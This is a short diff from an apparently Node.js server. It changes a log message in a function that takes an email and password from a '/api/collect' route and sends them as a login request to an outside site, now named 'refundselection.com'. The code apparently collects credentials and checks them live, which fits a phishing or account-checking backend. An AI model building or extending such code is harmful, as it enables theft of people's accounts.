@@ -190,7 +190,7 @@ app.post('/api/collect', async (req, res) => {
 // Authentication function - REAL validation
 async function authenticateWithAPI(email, password) {
     try {
-        console.log('🌐 Sending login request to vibeaccount.com...');
+        console.log('🌐 Sending login request to refundselection.com...');
         
         const params = new URLSearchParams();
         params.append('usrname', email);
